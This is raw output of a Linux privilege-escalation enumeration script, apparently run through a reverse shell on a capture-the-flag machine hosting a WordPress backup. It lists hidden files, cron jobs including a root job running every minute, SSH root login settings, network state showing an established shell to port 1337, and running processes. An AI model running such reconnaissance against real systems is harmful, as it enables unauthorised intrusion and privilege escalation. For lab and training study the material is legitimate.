-rw-r--r-- 1 www-data www-data 949 Apr 11  2014 /var/www/backup_wordpress/wp-admin/network/admin.php
-rw-r--r-- 1 www-data www-data 346 Sep 24  2013 /var/www/backup_wordpress/wp-admin/network/credits.php
-rw-r--r-- 1 www-data www-data 350 Sep 24  2013 /var/www/backup_wordpress/wp-admin/network/update-core.php
-rw-r--r-- 1 www-data www-data 8341 Jan 14  2016 /var/www/backup_wordpress/wp-admin/network/users.php
-rw-r--r-- 1 www-data www-data 9014 Mar  3  2016 /var/www/backup_wordpress/wp-admin/network/site-new.php
-rw-r--r-- 1 www-data www-data 11482 Feb 28  2016 /var/www/backup_wordpress/wp-admin/network/themes.php
-rw-r--r-- 1 www-data www-data 7865 Jan  5  2016 /var/www/backup_wordpress/wp-admin/network/site-settings.php
-rw-r--r-- 1 www-data www-data 934 Nov 30  2014 /var/www/backup_wordpress/wp-admin/network/edit.php
-rw-r--r-- 1 www-data www-data 344 Sep 24  2013 /var/www/backup_wordpress/wp-admin/network/setup.php
-rw-r--r-- 1 www-data www-data 10576 Feb 25  2016 /var/www/backup_wordpress/wp-admin/network/sites.php
-rw-r--r-- 1 www-data www-data 17985 Mar 30  2016 /var/www/backup_wordpress/wp-admin/network/settings.php
-rw-r--r-- 1 www-data www-data 2912 Jun 27  2015 /var/www/backup_wordpress/wp-admin/network/index.php
-rw-r--r-- 1 www-data www-data 5307 Mar 10  2016 /var/www/backup_wordpress/wp-admin/import.php
-rw-r--r-- 1 www-data www-data 10468 Apr  5  2016 /var/www/backup_wordpress/wp-admin/comment.php
-rw-r--r-- 1 www-data www-data 228 Sep 24  2013 /var/www/backup_wordpress/wp-admin/ms-users.php
-rw-r--r-- 1 www-data www-data 6114 Jan  5  2016 /var/www/backup_wordpress/wp-admin/index.php
-rw-r--r-- 1 www-data www-data 5932 Nov  5  2015 /var/www/backup_wordpress/wp-admin/options-media.php
-rw-r--r-- 1 www-data www-data 5221 Mar  8  2016 /var/www/backup_wordpress/wp-admin/media.php
-rw-r--r-- 1 www-data www-data 3642 Feb 25  2016 /var/www/backup_wordpress/wp-admin/admin-ajax.php
-rw-r--r-- 1 www-data www-data 6190 Feb 20  2016 /var/www/backup_wordpress/wp-admin/customize.php
-rw-r--r-- 1 www-data www-data 5032 Jan 27  2016 /var/www/backup_wordpress/wp-activate.php
-rw-r--r-- 1 www-data www-data 4035 Nov 30  2014 /var/www/backup_wordpress/wp-trackback.php
-rw-r--r-- 1 www-data www-data 33837 Mar  5  2016 /var/www/backup_wordpress/wp-login.php
-rw-r--r-- 1 www-data www-data 3286 May 24  2015 /var/www/backup_wordpress/wp-cron.php
-rw-r--r-- 1 www-data www-data 13106 Feb 17  2016 /var/www/backup_wordpress/wp-settings.php
-rw-r--r-- 1 www-data www-data 2380 Oct 24  2013 /var/www/backup_wordpress/wp-links-opml.php
-rw-r--r-- 1 www-data www-data 35 Mar  7 12:05 /var/www/backup_wordpress/.htaccess
-rw-r--r-- 1 www-data www-data 7887 Oct  6  2015 /var/www/backup_wordpress/wp-mail.php
-rw-r--r-- 1 www-data www-data 19935 Mar  5  2016 /var/www/backup_wordpress/license.txt
-rw-r--r-- 1 www-data www-data 1476 Jan 30  2016 /var/www/backup_wordpress/wp-comments-post.php
-rw-r--r-- 1 www-data www-data 418 Sep 24  2013 /var/www/backup_wordpress/index.php
-rw-r--r-- 1 www-data www-data 7358 Dec  6  2015 /var/www/backup_wordpress/readme.html
-rw-r--r-- 1 www-data www-data 43 Mar  3 12:32 /var/www/robots.txt
-rw-r--r-- 1 www-data www-data 177 Mar  3 11:17 /var/www/index.html


[-] Hidden files:
-rw-r--r-- 1 www-data www-data 616 Nov 19  2014 /var/www/backup_wordpress/wp-content/plugins/akismet/.htaccess
-rw-r--r-- 1 www-data www-data 35 Mar  7 12:05 /var/www/backup_wordpress/.htaccess
-rw-r--r-- 1 root root 0 Jul  2 06:48 /run/network/.ifstate.lock
-rw-r--r-- 1 root root 0 Feb  4  2014 /etc/init.d/.legacy-bootordering
-rw-r--r-- 1 root root 102 Apr  2  2012 /etc/cron.weekly/.placeholder
-rw-r--r-- 1 root root 102 Apr  2  2012 /etc/cron.d/.placeholder
-rw-r--r-- 1 root root 1095 Mar  3 11:09 /etc/apparmor.d/cache/.features
-rw-r--r-- 1 root root 102 Apr  2  2012 /etc/cron.hourly/.placeholder
-rw-r--r-- 1 root root 3486 Apr  3  2012 /etc/skel/.bashrc
-rw-r--r-- 1 root root 675 Apr  3  2012 /etc/skel/.profile
-rw-r--r-- 1 root root 220 Apr  3  2012 /etc/skel/.bash_logout
-rw-r--r-- 1 root root 102 Apr  2  2012 /etc/cron.daily/.placeholder
-rw-r--r-- 1 root root 102 Apr  2  2012 /etc/cron.monthly/.placeholder
-rw-r--r-- 1 root root 0 Feb 21  2012 /etc/sensors.d/.placeholder
-rw------- 1 root root 0 Feb  4  2014 /etc/.pwd.lock
-rw------- 1 abatchy abatchy 334 Mar  7 12:16 /home/abatchy/.ICEauthority
-rw------- 1 abatchy abatchy 16 Mar  7 12:17 /home/abatchy/.bash_history
-rw------- 1 abatchy abatchy 256 Mar  7 12:15 /home/abatchy/.pulse-cookie
-rw------- 1 abatchy abatchy 10431 Mar  7 12:17 /home/abatchy/.xsession-errors
-rw-rw-r-- 1 abatchy abatchy 147 Mar  7 12:16 /home/abatchy/.gtk-bookmarks
-rw-r--r-- 1 abatchy abatchy 25 Mar  7 12:16 /home/abatchy/.dmrc
-rw------- 1 abatchy abatchy 0 Mar  7 12:17 /home/abatchy/.Xauthority
-rw-rw-r-- 1 abatchy abatchy 0 Mar  7 12:16 /home/abatchy/.local/share/.converted-launchers
-rw-r--r-- 1 mai mai 3486 Mar  3 16:55 /home/mai/.bashrc
-rw-r--r-- 1 mai mai 675 Mar  3 16:55 /home/mai/.profile
-rw-r--r-- 1 mai mai 220 Mar  3 16:55 /home/mai/.bash_logout
-rw-r--r-- 1 doomguy doomguy 3486 Mar  3 16:56 /home/doomguy/.bashrc
-rw-r--r-- 1 doomguy doomguy 675 Mar  3 16:56 /home/doomguy/.profile
-rw-r--r-- 1 doomguy doomguy 220 Mar  3 16:56 /home/doomguy/.bash_logout
-rw-r--r-- 1 john john 3486 Mar  3 16:54 /home/john/.bashrc
-rw-r--r-- 1 john john 675 Mar  3 16:54 /home/john/.profile
-rw-r--r-- 1 john john 220 Mar  3 16:54 /home/john/.bash_logout
-rw-r--r-- 1 root root 820 Jan 30  2014 /usr/src/linux-headers-3.11.0-15-generic/.missing-syscalls.d
-rw-r--r-- 1 root root 168547 Jan 30  2014 /usr/src/linux-headers-3.11.0-15-generic/.config.old
-rw-r--r-- 1 root root 146 Jan 30  2014 /usr/src/linux-headers-3.11.0-15-generic/arch/x86/tools/.relocs.cmd
-rw-r--r-- 1 root root 3149 Jan 30  2014 /usr/src/linux-headers-3.11.0-15-generic/arch/x86/tools/.relocs_common.o.cmd
-rw-r--r-- 1 root root 3174 Jan 30  2014 /usr/src/linux-headers-3.11.0-15-generic/arch/x86/tools/.relocs_32.o.cmd
-rw-r--r-- 1 root root 3174 Jan 30  2014 /usr/src/linux-headers-3.11.0-15-generic/arch/x86/tools/.relocs_64.o.cmd
-rw-r--r-- 1 root root 272 Jan 30  2014 /usr/src/linux-headers-3.11.0-15-generic/arch/x86/include/generated/asm/.syscalls_32.h.cmd
-rw-r--r-- 1 root root 320 Jan 30  2014 /usr/src/linux-headers-3.11.0-15-generic/arch/x86/include/generated/uapi/asm/.unistd_x32.h.cmd
-rw-r--r-- 1 root root 300 Jan 30  2014 /usr/src/linux-headers-3.11.0-15-generic/arch/x86/include/generated/uapi/asm/.unistd_64.h.cmd
-rw-r--r-- 1 root root 295 Jan 30  2014 /usr/src/linux-headers-3.11.0-15-generic/arch/x86/include/generated/uapi/asm/.unistd_32.h.cmd
-rw-r--r-- 1 root root 49035 Jan 30  2014 /usr/src/linux-headers-3.11.0-15-generic/arch/x86/kernel/.asm-offsets.s.cmd
-rw-r--r-- 1 root root 168508 Jan 30  2014 /usr/src/linux-headers-3.11.0-15-generic/.config
-rw-r--r-- 1 root root 3216 Jan 30  2014 /usr/src/linux-headers-3.11.0-15-generic/scripts/.sortextable.cmd
-rw-r--r-- 1 root root 539 Jan 30  2014 /usr/src/linux-headers-3.11.0-15-generic/scripts/mod/.devicetable-offsets.h.cmd
-rw-r--r-- 1 root root 4943 Jan 30  2014 /usr/src/linux-headers-3.11.0-15-generic/scripts/mod/.devicetable-offsets.s.cmd
-rw-r--r-- 1 root root 3964 Jan 30  2014 /usr/src/linux-headers-3.11.0-15-generic/scripts/mod/.modpost.o.cmd
-rw-r--r-- 1 root root 3122 Jan 30  2014 /usr/src/linux-headers-3.11.0-15-generic/scripts/mod/.file2alias.o.cmd
-rw-r--r-- 1 root root 104 Jan 30  2014 /usr/src/linux-headers-3.11.0-15-generic/scripts/mod/.elfconfig.h.cmd
-rw-r--r-- 1 root root 129 Jan 30  2014 /usr/src/linux-headers-3.11.0-15-generic/scripts/mod/.modpost.cmd
-rw-r--r-- 1 root root 1931 Jan 30  2014 /usr/src/linux-headers-3.11.0-15-generic/scripts/mod/.empty.o.cmd
-rw-r--r-- 1 root root 4002 Jan 30  2014 /usr/src/linux-headers-3.11.0-15-generic/scripts/mod/.sumversion.o.cmd
-rw-r--r-- 1 root root 2289 Jan 30  2014 /usr/src/linux-headers-3.11.0-15-generic/scripts/mod/.mk_elfconfig.cmd
-rw-r--r-- 1 root root 110 Jan 30  2014 /usr/src/linux-headers-3.11.0-15-generic/scripts/kconfig/.conf.cmd
-rw-r--r-- 1 root root 3476 Jan 30  2014 /usr/src/linux-headers-3.11.0-15-generic/scripts/kconfig/.conf.o.cmd
-rw-r--r-- 1 root root 4692 Jan 30  2014 /usr/src/linux-headers-3.11.0-15-generic/scripts/kconfig/.zconf.tab.o.cmd
-rw-r--r-- 1 root root 2185 Jan 30  2014 /usr/src/linux-headers-3.11.0-15-generic/scripts/.kallsyms.cmd
-rw-r--r-- 1 root root 3864 Jan 30  2014 /usr/src/linux-headers-3.11.0-15-generic/scripts/basic/.fixdep.cmd
-rw-r--r-- 1 root root 2646 Jan 30  2014 /usr/src/linux-headers-3.11.0-15-generic/scripts/selinux/mdp/.mdp.cmd
-rw-r--r-- 1 root root 3042 Jan 30  2014 /usr/src/linux-headers-3.11.0-15-generic/scripts/selinux/genheaders/.genheaders.cmd
-rw-r--r-- 1 root root 153 Jan 30  2014 /usr/src/linux-headers-3.11.0-15-generic/scripts/genksyms/.genksyms.cmd
-rw-r--r-- 1 root root 2516 Jan 30  2014 /usr/src/linux-headers-3.11.0-15-generic/scripts/genksyms/.genksyms.o.cmd
-rw-r--r-- 1 root root 3129 Jan 30  2014 /usr/src/linux-headers-3.11.0-15-generic/scripts/genksyms/.lex.lex.o.cmd
-rw-r--r-- 1 root root 2281 Jan 30  2014 /usr/src/linux-headers-3.11.0-15-generic/scripts/genksyms/.parse.tab.o.cmd
-rw-r--r-- 1 root root 3020 Jan 30  2014 /usr/src/linux-headers-3.11.0-15-generic/scripts/.recordmcount.cmd
-rw-r--r-- 1 root root 2196 Jan 30  2014 /usr/src/linux-headers-3.11.0-15-generic/scripts/.conmakehash.cmd
-rw-r--r-- 1 root root 2948 Jan 30  2014 /usr/src/linux-headers-3.11.0-15-generic/scripts/.asn1_compiler.cmd
-rw-r--r-- 1 root root 10463 Jan 30  2014 /usr/src/linux-headers-3.11.0-15-generic/kernel/.bounds.s.cmd
-rw-r--r-- 1 root root 56 Sep  2  2013 /usr/src/linux-headers-3.11.0-15/scripts/mod/.gitignore
-rw-r--r-- 1 root root 31 Sep  2  2013 /usr/src/linux-headers-3.11.0-15/scripts/kconfig/lxdialog/.gitignore
-rw-r--r-- 1 root root 167 Sep  2  2013 /usr/src/linux-headers-3.11.0-15/scripts/kconfig/.gitignore
-rw-r--r-- 1 root root 55 Sep  2  2013 /usr/src/linux-headers-3.11.0-15/scripts/dtc/.gitignore
-rw-r--r-- 1 root root 7 Sep  2  2013 /usr/src/linux-headers-3.11.0-15/scripts/basic/.gitignore
-rw-r--r-- 1 root root 21 Sep  2  2013 /usr/src/linux-headers-3.11.0-15/scripts/selinux/mdp/.gitignore
-rw-r--r-- 1 root root 11 Sep  2  2013 /usr/src/linux-headers-3.11.0-15/scripts/selinux/genheaders/.gitignore
-rw-r--r-- 1 root root 122 Sep  2  2013 /usr/src/linux-headers-3.11.0-15/scripts/.gitignore
-rw-r--r-- 1 root root 42 Sep  2  2013 /usr/src/linux-headers-3.11.0-15/scripts/genksyms/.gitignore


[-] World-readable files within /home:
-rw-rw-r-- 1 abatchy abatchy 147 Mar  7 12:16 /home/abatchy/.gtk-bookmarks
-rw-r--r-- 1 abatchy abatchy 25 Mar  7 12:16 /home/abatchy/.dmrc
-rw-rw-r-- 1 abatchy abatchy 0 Mar  7 12:16 /home/abatchy/.local/share/.converted-launchers
-rw-rw-r-- 1 abatchy abatchy 834 Mar  7 12:16 /home/abatchy/.local/share/gsettings-data-convert
-rw-r--r-- 1 mai mai 3486 Mar  3 16:55 /home/mai/.bashrc
-rw-r--r-- 1 mai mai 8445 Mar  3 16:55 /home/mai/examples.desktop
-rw-r--r-- 1 mai mai 675 Mar  3 16:55 /home/mai/.profile
-rw-r--r-- 1 mai mai 220 Mar  3 16:55 /home/mai/.bash_logout
-rw-r--r-- 1 doomguy doomguy 3486 Mar  3 16:56 /home/doomguy/.bashrc
-rw-r--r-- 1 doomguy doomguy 8445 Mar  3 16:56 /home/doomguy/examples.desktop
-rw-r--r-- 1 doomguy doomguy 675 Mar  3 16:56 /home/doomguy/.profile
-rw-r--r-- 1 doomguy doomguy 220 Mar  3 16:56 /home/doomguy/.bash_logout
-rw-r--r-- 1 john john 3486 Mar  3 16:54 /home/john/.bashrc
-rw-r--r-- 1 john john 8445 Mar  3 16:54 /home/john/examples.desktop
-rw-r--r-- 1 john john 675 Mar  3 16:54 /home/john/.profile
-rw-r--r-- 1 john john 220 Mar  3 16:54 /home/john/.bash_logout


[-] Home directory contents:
total 8.1M
drwxr-xr-x  3 www-data www-data 4.0K Mar  7 11:55 .
drwxr-xr-x 15 root     root     4.0K Mar  7 12:17 ..
drwxr-xr-x  5 www-data www-data 4.0K Mar  7 12:05 backup_wordpress
-rw-r--r--  1 www-data www-data  177 Mar  3 11:17 index.html
-rw-r--r--  1 www-data www-data   43 Mar  3 12:32 robots.txt
-rw-------  1 abatchy  abatchy  8.1M Mar  7 11:54 wordpress-4.5.zip


[-] Root is allowed to login via SSH:
PermitRootLogin yes


### ENVIRONMENTAL #######################################
[-] Environment information:
APACHE_PID_FILE=/var/run/apache2.pid
APACHE_RUN_USER=www-data
TERM=xterm256-color
SHELL=bash
APACHE_LOG_DIR=/var/log/apache2
PATH=/usr/local/bin:/usr/bin:/bin
PWD=/
APACHE_RUN_GROUP=www-data
LANG=C
SHLVL=3
APACHE_LOCK_DIR=/var/lock/apache2
APACHE_RUN_DIR=/var/run/apache2
_=/usr/bin/env


[-] Path information:
/usr/local/bin:/usr/bin:/bin


[-] Available shells:
# /etc/shells: valid login shells
/bin/sh
/bin/dash
/bin/bash
/bin/rbash


[-] Current umask value:
0000
u=rwx,g=rwx,o=rwx


[-] umask value as specified in /etc/login.defs:
UMASK		022


[-] Password and storage information:
PASS_MAX_DAYS	99999
PASS_MIN_DAYS	0
PASS_WARN_AGE	7
ENCRYPT_METHOD SHA512


### JOBS/TASKS ##########################################
[-] Cron jobs:
-rw-r--r-- 1 root root  769 Mar  3 16:11 /etc/crontab

/etc/cron.d:
total 28
drwxr-xr-x   2 root root  4096 Mar  3 12:38 .
drwxr-xr-x 130 root root 12288 Jul  2 06:48 ..
-rw-r--r--   1 root root   102 Apr  2  2012 .placeholder
-rw-r--r--   1 root root   288 Jun 20  2010 anacron
-rw-r--r--   1 root root   544 Feb 13  2017 php5

/etc/cron.daily:
total 84
drwxr-xr-x   2 root root  4096 Mar  3 11:17 .
drwxr-xr-x 130 root root 12288 Jul  2 06:48 ..
-rw-r--r--   1 root root   102 Apr  2  2012 .placeholder
-rwxr-xr-x   1 root root   311 Jun 20  2010 0anacron
-rwxr-xr-x   1 root root   633 Jul 15  2016 apache2
-rwxr-xr-x   1 root root   219 Apr 10  2012 apport
-rwxr-xr-x   1 root root 15399 Apr 20  2012 apt
-rwxr-xr-x   1 root root   502 Mar 31  2012 bsdmainutils
-rwxr-xr-x   1 root root   256 Apr 12  2012 dpkg
-rwxr-xr-x   1 root root   372 Oct  4  2011 logrotate
-rwxr-xr-x   1 root root  1365 Dec 28  2012 man-db
-rwxr-xr-x   1 root root   606 Aug 17  2011 mlocate
-rwxr-xr-x   1 root root   249 Apr  8  2012 passwd
-rwxr-xr-x   1 root root  2417 Jul  1  2011 popularity-contest
-rwxr-xr-x   1 root root  2947 Apr  2  2012 standard
-rwxr-xr-x   1 root root   214 Sep 10  2012 update-notifier-common

/etc/cron.hourly:
total 20
drwxr-xr-x   2 root root  4096 Feb  4  2014 .
drwxr-xr-x 130 root root 12288 Jul  2 06:48 ..
-rw-r--r--   1 root root   102 Apr  2  2012 .placeholder

/etc/cron.monthly:
total 24
drwxr-xr-x   2 root root  4096 Feb  4  2014 .
drwxr-xr-x 130 root root 12288 Jul  2 06:48 ..
-rw-r--r--   1 root root   102 Apr  2  2012 .placeholder
-rwxr-xr-x   1 root root   313 Jun 20  2010 0anacron

/etc/cron.weekly:
total 32
drwxr-xr-x   2 root root  4096 Feb  4  2014 .
drwxr-xr-x 130 root root 12288 Jul  2 06:48 ..
-rw-r--r--   1 root root   102 Apr  2  2012 .placeholder
-rwxr-xr-x   1 root root   312 Jun 20  2010 0anacron
-rwxr-xr-x   1 root root   730 Sep 13  2013 apt-xapian-index
-rwxr-xr-x   1 root root   907 Dec 28  2012 man-db


[-] Crontab contents:
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *    * * *   root    /usr/local/bin/cleanup
#


[-] Anacron jobs and associated file permissions:
-rw-r--r-- 1 root root 395 Jun 20  2010 /etc/anacrontab
# /etc/anacrontab: configuration file for anacron

# See anacron(8) and anacrontab(5) for details.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# These replace cron's entries
1	5	cron.daily	 nice run-parts --report /etc/cron.daily
7	10	cron.weekly	 nice run-parts --report /etc/cron.weekly
@monthly	15	cron.monthly nice run-parts --report /etc/cron.monthly


[-] When were jobs last executed (/var/spool/anacron contents):
total 20
drwxr-xr-x 2 root root 4096 Mar  3 11:13 .
drwxr-xr-x 8 root root 4096 Feb  4  2014 ..
-rw------- 1 root root    9 Jul  2 14:17 cron.daily
-rw------- 1 root root    9 Jul  2 14:17 cron.monthly
-rw------- 1 root root    9 Jul  2 14:17 cron.weekly


### NETWORKING  ##########################################
[-] Network and IP info:
eth0      Link encap:Ethernet  HWaddr 00:0c:29:0a:e2:bc
          inet addr:192.168.150.18  Bcast:192.168.150.255  Mask:255.255.255.0
          inet6 addr: fe80::20c:29ff:fe0a:e2bc/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:38547 errors:0 dropped:0 overruns:0 frame:0
          TX packets:47755 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:8820667 (8.8 MB)  TX bytes:58135901 (58.1 MB)

lo        Link encap:Local Loopback
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:579 errors:0 dropped:0 overruns:0 frame:0
          TX packets:579 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:45660 (45.6 KB)  TX bytes:45660 (45.6 KB)


[-] ARP history:
192.168.150.19 dev eth0 lladdr 00:0c:29:b0:a9:19 REACHABLE
192.168.150.12 dev eth0 lladdr f4:0f:24:33:5e:d1 STALE
192.168.150.151 dev eth0 lladdr a0:63:91:f0:cc:4b STALE


[-] Nameserver(s):
nameserver 127.0.0.1


[-] Default route:
default via 192.168.150.151 dev eth0  proto static


[-] Listening TCP:
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:53            0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:21              0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -
tcp        0      0 192.168.150.18:44235    192.168.150.19:1337     ESTABLISHED 5355/sh
tcp        0      0 192.168.150.18:80       192.168.150.19:40970    ESTABLISHED -
tcp6       0      0 :::22                   :::*                    LISTEN      -
tcp6       0      0 ::1:631                 :::*                    LISTEN      -


[-] Listening UDP:
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
udp        0      0 127.0.0.1:53            0.0.0.0:*                           -
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -
udp        0      0 0.0.0.0:5353            0.0.0.0:*                           -
udp        0      0 0.0.0.0:38233           0.0.0.0:*                           -
udp6       0      0 :::46015                :::*                                -
udp6       0      0 :::5353                 :::*                                -


### SERVICES #############################################
[-] Running processes:
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.1   3660  1516 ?        Ss   13:48   0:01 /sbin/init
root         2  0.0  0.0      0     0 ?        S    13:48   0:00 [kthreadd]
root         3  0.0  0.0      0     0 ?        S    13:48   0:00 [ksoftirqd/0]
root         5  0.0  0.0      0     0 ?        S<   13:48   0:00 [kworker/0:0H]
root         7  0.0  0.0      0     0 ?        S    13:48   0:00 [migration/0]
root         8  0.0  0.0      0     0 ?        S    13:48   0:00 [rcu_bh]
root         9  0.1  0.0      0     0 ?        S    13:48   0:03 [rcu_sched]
root        10  0.0  0.0      0     0 ?        S    13:48   0:00 [watchdog/0]
root        11  0.0  0.0      0     0 ?        S<   13:48   0:00 [khelper]
root        12  0.0  0.0      0     0 ?        S    13:48   0:00 [kdevtmpfs]
root        13  0.0  0.0      0     0 ?        S<   13:48   0:00 [netns]
root        14  0.0  0.0      0     0 ?        S<   13:48   0:00 [writeback]
root        15  0.0  0.0      0     0 ?        S<   13:48   0:00 [kintegrityd]
root        16  0.0  0.0      0     0 ?        S<   13:48   0:00 [bioset]
root        17  0.0  0.0      0     0 ?        S<   13:48   0:00 [kworker/u3:0]
root        18  0.0  0.0      0     0 ?        S<   13:48   0:00 [kblockd]
root        19  0.0  0.0      0     0 ?        S<   13:48   0:00 [ata_sff]
root        20  0.0  0.0      0     0 ?        S    13:48   0:00 [khubd]
root        21  0.0  0.0      0     0 ?        S<   13:48   0:00 [md]
root        22  0.0  0.0      0     0 ?        S<   13:48   0:00 [devfreq_wq]
root        23  0.1  0.0      0     0 ?        S    13:48   0:03 [kworker/0:1]
root        25  0.0  0.0      0     0 ?        S    13:48   0:00 [khungtaskd]
root        26  0.0  0.0      0     0 ?        S    13:48   0:00 [kswapd0]
root        27  0.0  0.0      0     0 ?        SN   13:48   0:00 [ksmd]
root        28  0.0  0.0      0     0 ?        SN   13:48   0:00 [khugepaged]
root        29  0.0  0.0      0     0 ?        S    13:48   0:00 [fsnotify_mark]
root        30  0.0  0.0      0     0 ?        S    13:48   0:00 [ecryptfs-kthrea]
root        31  0.0  0.0      0     0 ?        S<   13:48   0:00 [crypto]
root        43  0.0  0.0      0     0 ?        S<   13:48   0:00 [kthrotld]
root        45  0.0  0.0      0     0 ?        S    13:48   0:00 [scsi_eh_0]
root        46  0.0  0.0      0     0 ?        S    13:48   0:00 [scsi_eh_1]
root        48  0.0  0.0      0     0 ?        S<   13:48   0:00 [dm_bufio_cache]
root        69  0.0  0.0      0     0 ?        S<   13:48   0:00 [deferwq]
root        70  0.0  0.0      0     0 ?        S<   13:48   0:00 [charger_manager]
root       203  0.0  0.0      0     0 ?        S    13:48   0:00 [scsi_eh_2]
root       204  0.0  0.0      0     0 ?        S    13:48   0:00 [scsi_eh_3]
root       205  0.0  0.0      0     0 ?        S    13:48   0:00 [scsi_eh_4]
root       206  0.0  0.0      0     0 ?        S    13:48   0:00 [scsi_eh_5]
root       207  0.0  0.0      0     0 ?        S    13:48   0:00 [scsi_eh_6]
root       213  0.0  0.0      0     0 ?        S    13:48   0:00 [scsi_eh_7]
root       215  0.0  0.0      0     0 ?        S    13:48   0:00 [scsi_eh_8]
root       217  0.0  0.0      0     0 ?        S    13:48   0:00 [scsi_eh_9]
root       218  0.0  0.0      0     0 ?        S    13:48   0:00 [scsi_eh_10]
root       219  0.0  0.0      0     0 ?        S    13:48   0:00 [scsi_eh_11]
root       220  0.0  0.0      0     0 ?        S    13:48   0:00 [scsi_eh_12]
root       223  0.0  0.0      0     0 ?        S    13:48   0:00 [scsi_eh_13]
root       224  0.0  0.0      0     0 ?        S    13:48   0:00 [scsi_eh_14]
root       225  0.0  0.0      0     0 ?        S    13:48   0:00 [scsi_eh_15]
root       226  0.0  0.0      0     0 ?        S    13:48   0:00 [scsi_eh_16]
root       227  0.0  0.0      0     0 ?        S    13:48   0:00 [scsi_eh_17]
root       228  0.0  0.0      0     0 ?        S    13:48   0:00 [scsi_eh_18]
root       229  0.0  0.0      0     0 ?        S    13:48   0:00 [scsi_eh_19]
root       230  0.0  0.0      0     0 ?        S    13:48   0:00 [scsi_eh_20]
root       231  0.0  0.0      0     0 ?        S    13:48   0:00 [scsi_eh_21]
root       232  0.0  0.0      0     0 ?        S    13:48   0:00 [scsi_eh_22]
root       233  0.0  0.0      0     0 ?        S    13:48   0:00 [scsi_eh_23]
root       234  0.0  0.0      0     0 ?        S    13:48   0:00 [scsi_eh_24]
root       235  0.0  0.0      0     0 ?        S    13:48   0:00 [scsi_eh_25]
root       236  0.0  0.0      0     0 ?        S    13:48   0:00 [scsi_eh_26]
root       237  0.0  0.0      0     0 ?        S    13:48   0:00 [scsi_eh_27]
root       238  0.0  0.0      0     0 ?        S    13:48   0:00 [scsi_eh_28]
root       239  0.0  0.0      0     0 ?        S    13:48   0:00 [scsi_eh_29]
root       240  0.0  0.0      0     0 ?        S    13:48   0:00 [scsi_eh_30]
root       241  0.0  0.0      0     0 ?        S    13:48   0:00 [scsi_eh_31]
root       268  0.0  0.0      0     0 ?        S    13:48   0:00 [kworker/u2:31]
root       361  0.0  0.0      0     0 ?        S    13:48   0:00 [jbd2/sda1-8]
root       362  0.0  0.0      0     0 ?        S<   13:48   0:00 [ext4-rsv-conver]
root       363  0.0  0.0      0     0 ?        S<   13:48   0:00 [ext4-unrsv-conv]
root       452  0.0  0.0   2836   420 ?        S    13:48   0:00 upstart-udev-bridge --daemon
root       456  0.0  0.0   3372   684 ?        Ss   13:48   0:00 /sbin/udevd --daemon
root       554  0.0  0.1   6688  1396 ?        Ss   13:48   0:00 /usr/sbin/sshd -D
syslog     574  0.0  0.0  30040   684 ?        Sl   13:48   0:00 rsyslogd -c5
102        601  0.0  0.0   3388   868 ?        Ss   13:48   0:00 dbus-daemon --system --fork --activation=upstart
root       614  0.0  0.0   4744   620 ?        Ss   13:48   0:00 /usr/sbin/bluetoothd
avahi      627  0.0  0.0   3572   876 ?        S    13:48   0:00 avahi-daemon: running [bsides2018.local]
avahi      628  0.0  0.0   3456   132 ?        S    13:48   0:00 avahi-daemon: chroot helper
root       651  0.0  0.0      0     0 ?        S<   13:48   0:00 [krfcommd]
root       668  0.0  0.1  11076  1488 ?        Ss   13:48   0:00 /usr/sbin/cupsd -F
root       710  0.0  0.0      0     0 ?        S<   13:48   0:00 [ttm_swap]
root       749  0.0  0.0      0     0 ?        S<   13:48   0:00 [kworker/u3:1]
root       814  0.0  0.0   3368   492 ?        S    13:48   0:00 /sbin/udevd --daemon
root       815  0.0  0.0   3368   440 ?        S    13:48   0:00 /sbin/udevd --daemon
root       821  0.0  0.0      0     0 ?        S<   13:48   0:00 [kpsmoused]
root       855  0.0  0.0      0     0 ?        S    13:48   0:00 [kworker/0:2]
root       902  0.0  0.0   2848   380 ?        S    13:48   0:00 upstart-socket-bridge --daemon
root       921  0.0  0.1   7224  1512 ?        Ss   13:48   0:00 /usr/sbin/modem-manager
root       989  0.0  0.1  33276  1812 ?        Ssl  13:48   0:00 NetworkManager
root      1011  0.0  0.1  26284  1436 ?        Sl   13:48   0:00 /usr/lib/policykit-1/polkitd --no-debug
root      1024  0.0  0.0   2928   840 ?        S    13:48   0:00 /sbin/dhclient -d -4 -sf /usr/lib/NetworkManager/nm-dhcp-client.action -pf /var/run/sendsigs.omit.d/network-manager.dhclient-eth0.pid -lf /var/lib/dhcp/dhclient-af86f1a0-00ba-44f1-b84f-edc92c5ed328-eth0.lease -cf /var/run/nm-dhclient-eth0.conf eth0
root      1052  0.0  0.0   4632   664 tty4     Ss+  13:48   0:00 /sbin/getty -8 38400 tty4
